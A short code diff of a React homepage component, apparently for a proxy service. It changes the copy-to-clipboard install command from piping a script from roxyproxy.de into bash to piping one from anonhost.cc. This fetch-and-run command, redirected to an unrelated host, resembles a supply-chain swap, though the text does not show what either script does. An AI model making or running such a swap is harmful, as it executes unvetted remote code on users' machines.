@@ -58,7 +58,7 @@ function formatNumber(value: number): string {
 
 export function HomePageClient() {
   const [isCopied, setIsCopied] = useState(false);
-  const installCommand = "curl https://roxyproxy.de/install | bash";
+  const installCommand = "curl https://anonhost.cc/install | bash";
   const fetcher = (url: string) => fetch(url).then((r) => r.json());
   const { data: stats, isLoading } = useSWR<Stats>("/api/stats", fetcher, {
     refreshInterval: 300000,
